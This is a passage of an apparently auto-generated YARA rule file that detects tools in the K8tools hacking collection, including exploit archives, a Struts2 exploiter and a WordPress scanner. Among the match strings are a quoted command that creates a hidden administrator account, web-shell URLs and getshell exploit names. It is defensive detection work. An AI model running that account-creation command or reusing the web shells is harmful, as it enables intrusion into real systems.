      $s3 = "324  Magento 1.7.0.2 XML-RPC etc/passwd" fullword ascii /* score: '21.42'*/
      $s4 = "306  CMS Made Simple 1.1.2 Remote Code Execution Vulnerability" fullword ascii /* score: '21.00'*/
      $s5 = "346  JBoss jmx-console Getshell exploit" fullword ascii /* score: '18.42'*/
      $s6 = "323  Magento 1.7.0.2 XML-RPC  boot.ini" fullword ascii /* score: '17.17'*/
      $s7 = "289  Discuz! 6.0 '2fly_gift.php' SQL Injection Vulnerability" fullword ascii /* score: '17.00'*/
      $s8 = "316  Photo Uploader 1.8 " fullword ascii /* score: '15.00'*/
      $s9 = "219  S2-020 getshell" fullword ascii /* score: '14.42'*/
      $s10 = "222  S2-020 getshell" fullword ascii /* score: '14.42'*/
      $s11 = "221  S2-020 getshell" fullword ascii /* score: '14.42'*/
      $s12 = "220  S2-020 getshell" fullword ascii /* score: '14.42'*/
      $s13 = "224  S2-020 getshell" fullword ascii /* score: '14.42'*/
      $s14 = "321  elfinder <=2.0 rc1 GetShell  " fullword ascii /* score: '14.07'*/
      $s15 = "322  elfinder <=2.0 rc1 GetShell  " fullword ascii /* score: '14.07'*/
      $s16 = "343  Zabbix 2.2.x, 3.0.0-3.0.3 SQL inject" fullword ascii /* score: '14.00'*/
      $s17 = "318  Business Intelligence SQL injection" fullword ascii /* score: '14.00'*/
      $s18 = "317  Security & Firewall 3.9.0 SQL Injection" fullword ascii /* score: '14.00'*/
      $s19 = "GetShell" fullword ascii /* score: '14.00'*/
      $s20 = "236  Zimbra LFI Read localconfig.xml" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5430 and filesize < 10KB and
      8 of them
}

rule sshshell {
   meta:
      description = "K8tools - file sshshell.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "fbbbc1241847314b0dd44d0b00d249337bad34288bf1ea763b844c383fa1ee26"
   strings:
      $x1 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Central Brazilian Standard TimeMoun" ascii /* score: '69.50'*/
      $x2 = "ssh: unmarshal error for field %s of type %s%sstopTheWorld: not stopped (status != _Pgcstop)P has cached GC work at end of mark " ascii /* score: '54.00'*/
      $x3 = "> (den<<shift)/2syntax error scanning number45474735088646411895751953125Central America Standard TimeCentral Pacific Standard T" ascii /* score: '53.00'*/
      $x4 = "Pakistan Standard TimeParaguay Standard TimeSakhalin Standard TimeTasmania Standard Timeaddress already in useadvapi32.dll not f" ascii /* score: '50.00'*/
      $x5 = "non-IPv4 addressnon-IPv6 addressobject is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: gp: gp=" ascii /* score: '49.00'*/
      $x6 = "Variation_Selectorbad manualFreeListbufio: buffer fullconnection refusedcontext.Backgroundecdh-sha2-nistp256ecdh-sha2-nistp384ec" ascii /* score: '46.00'*/
      $x7 = "152587890625762939453125Bidi_ControlGetAddrInfoWGetConsoleCPGetLastErrorGetLengthSidGetStdHandleGetTempPathWJoin_ControlLoadLibr" ascii /* score: '44.00'*/
      $x8 = "unixpacketunknown pcws2_32.dll  of size   (targetpc= gcwaiting= gp.status= heap_live= idleprocs= in status  m->mcache= mallocing" ascii /* score: '43.00'*/
      $x9 = "ssh: channel response message received on inbound channelsync: WaitGroup misuse: Add called concurrently with Waitruntime: GetQu" ascii /* score: '39.50'*/
      $x10 = "of unexported method previous allocCount=186264514923095703125931322574615478515625AdjustTokenPrivilegesAlaskan Standard TimeAna" ascii /* score: '38.00'*/
      $x11 = "to unallocated span%%!%c(*big.Float=%s)37252902984619140625: leftover defer sp=Arabic Standard TimeAzores Standard TimeCertOpenS" ascii /* score: '35.00'*/
      $x12 = "invalid network interface nameinvalid pointer found on stacknode is not its parent's childnotetsleep - waitm out of syncprotocol" ascii /* score: '34.50'*/
      $x13 = "file descriptor in bad statefindrunnable: netpoll with pgcstopm: negative nmspinninginvalid runtime symbol tablelarge span treap" ascii /* score: '34.00'*/
      $x14 = "structure needs cleaningunknown channel type: %v bytes failed with errno= to unused region of span2910383045673370361328125AUS C" ascii /* score: '33.00'*/
      $x15 = "bad flushGen bad map statechannelEOFMsgdisconnectMsgempty integerexchange fullfatal error: gethostbynamegetservbynamehmac-sha2-2" ascii /* score: '33.00'*/
      $x16 = "mismatchadvapi32.dllbad flushGenbad g statusbad g0 stackbad recoverycan't happencas64 failedchan receivecontext.TODOdumping heap" ascii /* score: '32.00'*/
      $x17 = "MB) workers= called from  flushedWork  gcscanvalid  heap_marked= idlethreads= is nil, not  nStackRoots= s.spanclass= span.base()" ascii /* score: '32.00'*/
      $x18 = "bytes.Buffer: reader returned negative count from ReadgcControllerState.findRunnable: blackening not enabledinternal error: poll" ascii /* score: '31.00'*/
      $s19 = "garbage collection scangcDrain phase incorrectglobalRequestFailureMsgglobalRequestSuccessMsginterrupted system callinvalid m->lo" ascii /* score: '30.00'*/
      $s20 = "(%s)CreateFileMappingWCuba Standard TimeFiji Standard TimeGetComputerNameExWGetExitCodeProcessGetFileAttributesWGetModuleFileNam" ascii /* score: '28.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      ( pe.imphash() == "1c2a6fbef41572f4c9ce8acb5a63cde7" or ( 1 of ($x*) or all of them ) )
}

rule CVE_2018_2628_Weblogic_GetShell_Exploit {
   meta:
      description = "K8tools - file CVE-2018-2628 Weblogic GetShell Exploit.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "5e22969376916cc759fadaebda772e418e92359ee9db4546ec5a21b12d04ef52"
   strings:
      $s1 = "CVE-2018-2628 GetShell.exea" fullword ascii /* score: '22.00'*/
      $s2 = "GetShell.PNGa" fullword ascii /* score: '17.00'*/
      $s3 = "k8weblogicGUI.exea" fullword ascii /* score: '16.00'*/
      $s4 = "rem.txta" fullword ascii /* score: '8.00'*/
      $s5 = "a* dbbyq" fullword ascii /* score: '5.00'*/
      $s6 = "&DvVgBr1" fullword ascii /* score: '4.00'*/
      $s7 = "TXGTu\"w" fullword ascii /* score: '4.00'*/
      $s8 = "FnMN-+y" fullword ascii /* score: '4.00'*/
      $s9 = "#bpvI{%Z" fullword ascii /* score: '4.00'*/
      $s10 = "BNPH+|4" fullword ascii /* score: '4.00'*/
      $s11 = "EUnOr\\" fullword ascii /* score: '4.00'*/
      $s12 = "YIMr\"u" fullword ascii /* score: '4.00'*/
      $s13 = "w9CcFk|9)!z" fullword ascii /* score: '4.00'*/
      $s14 = "3TfFe!" fullword ascii /* score: '4.00'*/
      $s15 = "UxiO3<a" fullword ascii /* score: '4.00'*/
      $s16 = "lMVUnkY" fullword ascii /* score: '4.00'*/
      $s17 = "$CEEv>u@" fullword ascii /* score: '4.00'*/
      $s18 = "uRsEcjM" fullword ascii /* score: '4.00'*/
      $s19 = "n%v-mf" fullword ascii /* score: '3.50'*/
      $s20 = "\\NBP~9" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 400KB and
      8 of them
}

rule ________BT5_MSF_JAVA_0day_CVE_2013_0422_Exploit_Demo_By_K8team {
   meta:
      description = "K8tools - file [视频]BT5 MSF JAVA 0day CVE-2013-0422 Exploit Demo By K8team.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "656ea9fad3ff382bec36b1a8ddf07688d85c444981d309df0bcdbdf7acaf35e3"
   strings:
      $s1 = "BT5 MSF JAVA 0day CVE-2013-0422 Exploit Demo By K8team\\JAVA 0day CVE-2013-0422 Exploit Demo By K8team.exe" fullword ascii /* score: '19.00'*/
      $s2 = "'s Blog.url" fullword ascii /* score: '12.00'*/
      $s3 = "BT5 MSF JAVA 0day CVE-2013-0422 Exploit Demo By K8team\\JAVA 0day CVE-2013-0422 Exploit Demo By K8team.png" fullword ascii /* score: '11.00'*/
      $s4 = "qEyEHV3J," fullword ascii /* score: '9.00'*/
      $s5 = "* Yqd.n" fullword ascii /* score: '9.00'*/
      $s6 = "?77'/7777" fullword ascii /* score: '9.00'*/ /* hex encoded string 'www' */
      $s7 = "* AF}V" fullword ascii /* score: '9.00'*/
      $s8 = "* 2fd!" fullword ascii /* score: '9.00'*/
      $s9 = "BT5 MSF JAVA 0day CVE-2013-0422 Exploit Demo By K8team" fullword ascii /* score: '8.00'*/
      $s10 = "BT5 MSF JAVA 0day CVE-2013-0422 Exploit Demo By K8team\\K8" fullword ascii /* score: '8.00'*/
      $s11 = "pvviyyi" fullword ascii /* score: '8.00'*/
      $s12 = "kiYYYYyiY" fullword ascii /* score: '7.00'*/
      $s13 = "_WQYYYYUQY9" fullword ascii /* score: '7.00'*/
      $s14 = "QZ6n:\\1" fullword ascii /* score: '7.00'*/
      $s15 = "RVTTVXD" fullword ascii /* score: '6.50'*/
      $s16 = "MIMMJMA" fullword ascii /* score: '6.50'*/
      $s17 = "Wvggfggf" fullword ascii /* score: '6.00'*/
      $s18 = "=qOLOg2" fullword ascii /* score: '6.00'*/
      $s19 = "_@D_+ " fullword ascii /* score: '5.42'*/
      $s20 = "cwD=+ " fullword ascii /* score: '5.42'*/
   condition:
      uint16(0) == 0x6152 and filesize < 9000KB and
      8 of them
}

rule WPdetection {
   meta:
      description = "K8tools - file WPdetection.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "a7812be575c83daf208722fa4bc577b7223bf3de42bb572635146bb24a2dfa09"
   strings:
      $x1 = "c:\\Users\\K8team\\Desktop\\WPdetection\\WPdetection\\obj\\Debug\\WPdetection.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s3 = "WPdetection.exe" fullword wide /* score: '22.00'*/
      $s4 = "/wp-content/plugins/nextgen-gallery/changelog.txt" fullword wide /* score: '21.00'*/
      $s5 = "Yoast WordPress SEO plugin v(?<k8version>.*?) - http" fullword wide /* score: '15.00'*/
      $s6 = " Target: " fullword wide /* score: '14.17'*/
      $s7 = "Please Enter Target URL !" fullword wide /* score: '14.00'*/
      $s8 = "-----Getting WordPress Version" fullword wide /* score: '12.00'*/
      $s9 = "/wp-content/plugins/(?<k8plugin>.*?)/.*ver=(?<k8version>.*?)('|' |'>)" fullword wide /* score: '12.00'*/
      $s10 = "<meta name=\"generator\" content=\"(?<k8version>.*?)\" />" fullword wide /* score: '12.00'*/
      $s11 = "/wp-content/plugins/(?<k8plugin>.*?)/.*" fullword wide /* score: '9.00'*/
      $s12 = "postString" fullword ascii /* score: '9.00'*/
      $s13 = "K8WebClientGetHtml" fullword ascii /* score: '9.00'*/
      $s14 = "K8WebClientPostHtml" fullword ascii /* score: '9.00'*/
      $s15 = ".*= V(?<k8version>.*?) =" fullword wide /* score: '7.17'*/
      $s16 = "WPdetection.Properties.Resources" fullword wide /* score: '7.00'*/
      $s17 = "k8version" fullword wide /* score: '7.00'*/
      $s18 = "WPdetection.Properties.Resources.resources" fullword ascii /* score: '7.00'*/
      $s19 = "WPdetection.frmMain.resources" fullword ascii /* score: '7.00'*/
      $s20 = "WPdetection.Properties" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule Base32_Decode_20161110 {
   meta:
      description = "K8tools - file Base32_Decode_20161110.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "c4e538b2f8079b9d5591bdf33b030e7736becfdf938c8767afe81786f2b3cbcc"
   strings:
      $s1 = "Base32_Decode.exe" fullword ascii /* score: '21.00'*/
      $s2 = "b32.PNG" fullword ascii /* score: '7.00'*/
      $s3 = "# @A.e" fullword ascii /* score: '5.00'*/
      $s4 = "smAhR\"" fullword ascii /* score: '4.00'*/
      $s5 = "{4LlsT}6!Yp" fullword ascii /* score: '4.00'*/
      $s6 = "nsrbS1H/n" fullword ascii /* score: '4.00'*/
      $s7 = "wNDWN4" fullword ascii /* score: '2.00'*/
      $s8 = "\\$l2rt" fullword ascii /* score: '2.00'*/
      $s9 = "4dZ/x " fullword ascii /* score: '1.42'*/
      $s10 = "I`pZl{Y.-2C" fullword ascii /* score: '1.42'*/
      $s11 = "V3t<-_\"g\"'s" fullword ascii /* score: '1.00'*/
      $s12 = ":DGwnh" fullword ascii /* score: '1.00'*/
      $s13 = "|6wi'cn`" fullword ascii /* score: '1.00'*/
      $s14 = "&M#s<8" fullword ascii /* score: '1.00'*/
      $s15 = "hAWvQG" fullword ascii /* score: '1.00'*/
      $s16 = "dT\"$b(" fullword ascii /* score: '1.00'*/
      $s17 = "oI<2#dM" fullword ascii /* score: '1.00'*/
      $s18 = "zE-^7`(" fullword ascii /* score: '1.00'*/
      $s19 = "6@ B'n" fullword ascii /* score: '1.00'*/
      $s20 = "(NEW{8sOv" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 100KB and
      8 of them
}

rule K8_Struts2_EXP_S2_045______________________20170310 {
   meta:
      description = "K8tools - file K8_Struts2_EXP S2-045 & 任意文件上传 20170310.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "0a6c38a458af6ee06d955fdb1fa54263033ec1a534bc12cd9a5b6d8bc47a57e0"
   strings:
      $s1 = "K8_Struts2_EXP.exe" fullword ascii /* score: '19.00'*/
      $s2 = "rZNf^+ '\\a" fullword ascii /* score: '8.00'*/
      $s3 = "SpY^\\J" fullword ascii /* score: '6.00'*/
      $s4 = "S<ej- h" fullword ascii /* score: '5.00'*/
      $s5 = "\\any.PNG" fullword ascii /* score: '5.00'*/
      $s6 = "\\111.png" fullword ascii /* score: '5.00'*/
      $s7 = "PBdkvo3" fullword ascii /* score: '5.00'*/
      $s8 = "\\333.PNG" fullword ascii /* score: '5.00'*/
      $s9 = "\\222.PNG" fullword ascii /* score: '5.00'*/
      $s10 = "RPyV{M@O\"d" fullword ascii /* score: '4.00'*/
      $s11 = "ucXN<;g1Ze" fullword ascii /* score: '4.00'*/
      $s12 = "BMip?a" fullword ascii /* score: '4.00'*/
      $s13 = "S2-045.png" fullword ascii /* score: '4.00'*/
      $s14 = "0ZEhG\"5" fullword ascii /* score: '4.00'*/
      $s15 = "QVZD=J!" fullword ascii /* score: '4.00'*/
      $s16 = "giksm4F" fullword ascii /* score: '4.00'*/
      $s17 = "<XYke\\P" fullword ascii /* score: '4.00'*/
      $s18 = "ROuE_jCG" fullword ascii /* score: '4.00'*/
      $s19 = "DhBfd!|" fullword ascii /* score: '4.00'*/
      $s20 = "thsdx%]V" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule ms16135_____________________ {
   meta:
      description = "K8tools - file ms16135完美版提权演示.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "03739d26b0ea5fe70fb7a925a600d4d9c0890a29dd1ba9c18388cc9c3399a3ba"
   strings:
      $s1 = "Project1.exe" fullword ascii /* score: '22.00'*/
      $s2 = "jTBorland C++ - Copyright 1999 Inprise Corporation" fullword ascii /* score: '14.00'*/
      $s3 = "List count out of bounds (%d)+Operation not allowed on sorted string list%String list does not allow duplicates#A component name" wide /* score: '14.00'*/
      $s4 = "acmDriverOpen error!" fullword ascii /* score: '10.00'*/
      $s5 = "P4#!!!" fullword ascii /* score: '10.00'*/
      $s6 = "Bits index out of range/Menu '%s' is already being used by another formDocked control must have a name%Error removing control f" wide /* score: '9.00'*/
      $s7 = "PhJEyEcE{" fullword ascii /* score: '9.00'*/
      $s8 = "5\"5/565[6" fullword ascii /* score: '9.00'*/ /* hex encoded string 'UVV' */
      $s9 = "3*3<3F3~3" fullword ascii /* score: '9.00'*/ /* hex encoded string '3?3' */
      $s10 = "bfbl -A" fullword ascii /* score: '8.00'*/
      $s11 = "mytrackbar" fullword ascii /* score: '8.00'*/
      $s12 = "wwwwwwpwp" fullword ascii /* score: '8.00'*/
      $s13 = "playdjexei" fullword ascii /* score: '8.00'*/
      $s14 = "refreshdingwei" fullword ascii /* score: '8.00'*/
      $s15 = "vvsbwbp" fullword ascii /* score: '8.00'*/
      $s16 = "pmlxzjtlx" fullword ascii /* score: '8.00'*/
      $s17 = "wwwwwppppp" fullword ascii /* score: '8.00'*/
      $s18 = "gnbgfbd" fullword ascii /* score: '8.00'*/
      $s19 = "pmlxzjedj" fullword ascii /* score: '8.00'*/
      $s20 = "failed2" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      ( pe.imphash() == "75b138ec13121d15e5765e10b945ff23" and ( pe.exports("@@Unit1@Finalize") and pe.exports("@@Unit1@Initialize") and pe.exports("@@Unit2@Finalize") and pe.exports("@@Unit2@Initialize") and pe.exports("@@Unit3@Finalize") and pe.exports("@@Unit3@Initialize") ) or 8 of them )
}

rule net2_0day {
   meta:
      description = "K8tools - file net2.0day.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "479430dece7f6e344ec28377216a4a725c73534ad90e165c7070f79c34f147be"
   strings:
      $s1 = "c:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\mscorsvw.exe" fullword ascii /* score: '24.00'*/
      $s2 = "cmd /c net user ServiceHelper ILov3Coff33! /add & net localgroup Administrators ServiceHelper /add" fullword ascii /* score: '22.00'*/
      $s3 = "E:\\vc\\netex\\Debug\\zero.pdb" fullword ascii /* score: '19.00'*/
      $s4 = ".NET Runtime Optimization Service v2.0.50727_X86" fullword ascii /* score: '13.00'*/
      $s5 = "*command != _T('\\0')" fullword ascii /* score: '12.00'*/
      $s6 = "net start \"%s\" 2> NUL > NUL" fullword ascii /* score: '11.00'*/
      $s7 = "2029243=3" fullword ascii /* score: '9.00'*/ /* hex encoded string ' )$3' */
      $s8 = "spawnve.c" fullword ascii /* score: '7.00'*/
      $s9 = "ServiceHelper" fullword ascii /* score: '7.00'*/
      $s10 = "spawnvpe.c" fullword ascii /* score: '7.00'*/
      $s11 = "dospawn.c" fullword ascii /* score: '7.00'*/
      $s12 = "Object dump complete." fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.99'*/ /* Goodware String - occured 14 times */
      $s13 = "Client hook allocation failure." fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.99'*/ /* Goodware String - occured 14 times */
      $s14 = "command.com" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.91'*/ /* Goodware String - occured 91 times */
      $s15 = "COMSPEC" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.75'*/ /* Goodware String - occured 247 times */
      $s16 = "SYSTEM" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.49'*/ /* Goodware String - occured 509 times */
      $s17 = "**argv != _T('\\0')" fullword ascii /* score: '4.00'*/
      $s18 = "*filename != _T('\\0')" fullword ascii /* score: '4.00'*/
      $s19 = "clr_optimization_v2.0.50727_32" fullword ascii /* score: '4.00'*/
      $s20 = ">:D should have created a " fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      ( pe.imphash() == "3626d63c4d239dce68b25a68e99a08cf" or 8 of them )
}

rule fsmonitor_watchman {
   meta:
      description = "K8tools - file fsmonitor-watchman.sample"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "7f9cacf1f7c8f791abfaa76171b951a55a9a2a11f1390b43cbc83995b4a91b33"
   strings:
      $s1 = "# 'git config core.fsmonitor .git/hooks/query-watchman'" fullword ascii /* score: '14.00'*/
      $s2 = "# An example hook script to integrate Watchman" fullword ascii /* score: '14.00'*/
      $s3 = "if ($retry > 0 and $o->{error} and $o->{error} =~ m/unable to resolve root .* directory (.*) is not watched/) {" fullword ascii /* score: '14.00'*/
      $s4 = "# The hook is passed a version (currently 1) and a time in nanoseconds" fullword ascii /* score: '14.00'*/
      $s5 = "# Watchman query just to get it over with now so we won't pay" fullword ascii /* score: '13.00'*/
      $s6 = "die \"Watchman: command returned no output.\\n\" ." fullword ascii /* score: '12.00'*/
      $s7 = "die \"Watchman: command returned invalid output: $response\\n\" ." fullword ascii /* score: '12.00'*/
      $s8 = "my $pid = open2(\\*CHLD_OUT, \\*CHLD_IN, 'watchman -j --no-pretty')" fullword ascii /* score: '12.00'*/
      $s9 = "# (https://facebook.github.io/watchman/) with git to speed up detecting" fullword ascii /* score: '11.00'*/
      $s10 = "# Check the hook interface version" fullword ascii /* score: '11.00'*/
      $s11 = "# modified since the given time. Paths must be relative to the root of" fullword ascii /* score: '11.00'*/
      $s12 = "# To accomplish this, we're using the \"since\" generator to use the" fullword ascii /* score: '11.00'*/
      $s13 = "die \"Unsupported query-fsmonitor hook version '$version'.\\n\" ." fullword ascii /* score: '10.00'*/
      $s14 = "$git_work_tree = Win32::GetCwd();" fullword ascii /* score: '9.17'*/
      $s15 = "# further constrain the results." fullword ascii /* score: '8.00'*/
      $s16 = "# $time but no longer exist)." fullword ascii /* score: '8.00'*/
      $s17 = "# currently exist." fullword ascii /* score: '8.00'*/
      $s18 = "# convert nanoseconds to seconds" fullword ascii /* score: '8.00'*/
      $s19 = "# changed since $time but were not transient (ie created after" fullword ascii /* score: '8.00'*/
      $s20 = "# new and modified files." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 9KB and
      8 of them
}

rule pre_push {
   meta:
      description = "K8tools - file pre-push.sample"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "4b1119e1e13a212571976f4aee77847cdbd40978546d6273a557e238981a40d1"
   strings:
      $s1 = "# $1 -- Name of the remote to which the push is being done" fullword ascii /* score: '19.00'*/
      $s2 = "# $2 -- URL to which the push is being done" fullword ascii /* score: '16.00'*/
      $s3 = "# This sample shows how to prevent push of commits where the log message starts" fullword ascii /* score: '16.00'*/
      $s4 = "commit=`git rev-list -n 1 --grep '^WIP' \"$range\"`" fullword ascii /* score: '15.00'*/
      $s5 = "if [ -n \"$commit\" ]" fullword ascii /* score: '15.00'*/
      $s6 = "# pushed.  If this script exits with a non-zero status nothing will be pushed." fullword ascii /* score: '14.00'*/
      $s7 = "# Check for WIP commit" fullword ascii /* score: '11.00'*/
      $s8 = "# New branch, examine all commits" fullword ascii /* score: '11.00'*/
      $s9 = "# Update to existing branch, examine new commits" fullword ascii /* score: '11.00'*/
      $s10 = "# Information about the commits which are being pushed is supplied as lines to" fullword ascii /* score: '11.00'*/
      $s11 = "# push\" after it has checked the remote status, but before anything has been" fullword ascii /* score: '11.00'*/
      $s12 = "# If pushing without using a named remote those arguments will be equal." fullword ascii /* score: '11.00'*/
      $s13 = "# An example hook script to verify what is about to be pushed.  Called by \"git" fullword ascii /* score: '10.00'*/
      $s14 = "# Handle delete" fullword ascii /* score: '8.00'*/
      $s15 = "# with \"WIP\" (work in progress)." fullword ascii /* score: '8.00'*/
      $s16 = "# the standard input in the form:" fullword ascii /* score: '8.00'*/
      $s17 = "remote=\"$1\"" fullword ascii /* score: '7.00'*/
      $s18 = "if [ \"$remote_sha\" = $z40 ]" fullword ascii /* score: '7.00'*/
      $s19 = "while read local_ref local_sha remote_ref remote_sha" fullword ascii /* score: '6.00'*/
      $s20 = "echo >&2 \"Found WIP commit in $local_ref, not pushing\"" fullword ascii /* score: '6.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

rule K8tools_K8data {
   meta:
      description = "K8tools - file K8data.mdb"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "c907694be334b946df3e56b8c8530a4cc5aee427152e30e64066457ef8ba1cfb"
   strings:
      $s1 = "*\\G{00025E01-0000-0000-C000-000000000046}#5.0#0#C:\\Program Files\\Common Files\\Microsoft Shared\\DAO\\dao360.dll#Microsoft DA" wide /* score: '28.00'*/
      $s2 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\WINDOWS\\system32\\stdole2.tlb#OLE Automation" fullword wide /* score: '21.00'*/
      $s3 = "o360.dll" fullword ascii /* score: '20.00'*/
      $s4 = "*\\G{00000201-0000-0010-8000-00AA006D2EA4}#2.1#0#C:\\Program Files\\Common Files\\System\\ado\\msado21.tlb#Microsoft ActiveX Dat" wide /* score: '19.00'*/
      $s5 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.0#9#C:\\PROGRA~1\\CO~WARF9\\MI~EH8HH\\VBA\\VBA6\\VBE6.DLL#Visual Basic For Applicat" wide /* score: '18.00'*/
      $s6 = "http://192.168.85.157/cgi-bin/cmd.py" fullword ascii /* score: '17.00'*/
      $s7 = "http://192.168.85.157/cgi-bin/cmd.pl" fullword ascii /* score: '17.00'*/
      $s8 = "http://www.fbi.gov/shell.py" fullword ascii /* score: '15.00'*/
      $s9 = "http://192.168.85.218/php/1.php" fullword ascii /* score: '15.00'*/
      $s10 = "http://192.168.85.218/jsp/1.jsp" fullword ascii /* score: '15.00'*/
      $s11 = "http://192.168.85.218:2027/1.asp" fullword ascii /* score: '15.00'*/
      $s12 = "http://192.168.85.218/k8test/1.cfm" fullword ascii /* score: '15.00'*/
      $s13 = "http://192.168.85.150/2.php" fullword ascii /* score: '15.00'*/
      $s14 = "http://192.168.85.169:8080/struts2-blank/1.jsp" fullword ascii /* score: '15.00'*/
      $s15 = "fsdfds" fullword ascii /* reversed goodware string 'sdfdsf' */ /* score: '15.00'*/
      $s16 = "http://forum.imop.tw/forumdata/templ" fullword ascii /* score: '14.00'*/
      $s17 = "http://forum.imop.tw/forumdata/temp" fullword ascii /* score: '14.00'*/
      $s18 = "TargetLevel" fullword wide /* score: '14.00'*/
      $s19 = "*\\G{4AFFC9A0-5F99-101B-AF4E-00AA003F0F07}#9.0#0#C:\\Program Files\\Microsoft Office\\OFFICE11\\MSACC.OLB#Microsoft Access 11.0 " wide /* score: '13.00'*/
      $s20 = "http://192.168.85.218/active/1.aspx" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x0100 and filesize < 4000KB and
      8 of them
}

rule K8_ASP__________________ {
   meta:
      description = "K8tools - file K8-ASP注入漏洞环境.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "c2566256323e093b0bfd49bedc7be370aa7cacaff097276ca1cedaa5ebac3d0e"
   strings:
      $s1 = "hOCB* E" fullword ascii /* score: '8.00'*/
      $s2 = "\\show2.asp" fullword ascii /* score: '8.00'*/
      $s3 = "\\show.asp" fullword ascii /* score: '8.00'*/
      $s4 = "aacceeffhh" fullword ascii /* score: '8.00'*/
      $s5 = "\\index.asp" fullword ascii /* score: '8.00'*/
      $s6 = "\\conn.asp" fullword ascii /* score: '8.00'*/
      $s7 = "\\show3.asp" fullword ascii /* score: '8.00'*/
      $s8 = "\\show4.asp" fullword ascii /* score: '8.00'*/
      $s9 = "\\show5.asp" fullword ascii /* score: '8.00'*/
      $s10 = "\\save.asp" fullword ascii /* score: '8.00'*/
      $s11 = "\\crack8.mdb" fullword ascii /* score: '8.00'*/
      $s12 = "IIf:\"v" fullword ascii /* score: '7.00'*/
      $s13 = "# iS(5" fullword ascii /* score: '5.00'*/
      $s14 = "t&G* n" fullword ascii /* score: '5.00'*/
      $s15 = "\\say.asp" fullword ascii /* score: '5.00'*/
      $s16 = "ncie6f%~E " fullword ascii /* score: '4.42'*/
      $s17 = "zfcw? " fullword ascii /* score: '4.42'*/
      $s18 = "zGxzD ?" fullword ascii /* score: '4.00'*/
      $s19 = "RckvA N" fullword ascii /* score: '4.00'*/
      $s20 = "@nadZ8 N" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule K8_S2______ {
   meta:
      description = "K8tools - file K8-S2批量.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "7cea1363ebeff6b75951d5ba3747a33cd1ba7b3f8df90303e43d5703b0f881fc"
   strings:
      $s1 = "\\k8_S2auto.20170118_0.log" fullword ascii /* score: '17.00'*/
      $s2 = "@http://192.168.1.121:8080/struts2-blank/example/HelloWorld.action" fullword ascii /* score: '17.00'*/
      $s3 = "\\k8_S2auto.exe" fullword ascii /* score: '16.00'*/
      $s4 = "\\url.txt" fullword ascii /* score: '9.00'*/
      $s5 = "v(OKRaw* t" fullword ascii /* score: '8.00'*/
      $s6 = "g&O:\\e" fullword ascii /* score: '7.00'*/
      $s7 = "1mZ.avM" fullword ascii /* score: '7.00'*/
      $s8 = "+ J5;;" fullword ascii /* score: '5.00'*/
      $s9 = "!O}?6 -X" fullword ascii /* score: '5.00'*/
      $s10 = "wzwzkx" fullword ascii /* score: '5.00'*/
      $s11 = "fiyajs" fullword ascii /* score: '5.00'*/
      $s12 = "O- {uXgJO/" fullword ascii /* score: '5.00'*/
      $s13 = "BS1_-rvZr#;Af" fullword ascii /* score: '4.42'*/
      $s14 = "HvghyKcN " fullword ascii /* score: '4.42'*/
      $s15 = "HUtk}, " fullword ascii /* score: '4.42'*/
      $s16 = "\":_aIbd#yS" fullword ascii /* score: '4.00'*/
      $s17 = "ZdgLa M" fullword ascii /* score: '4.00'*/
      $s18 = "LNPRTVXZZ\\\\+_}Y" fullword ascii /* score: '4.00'*/
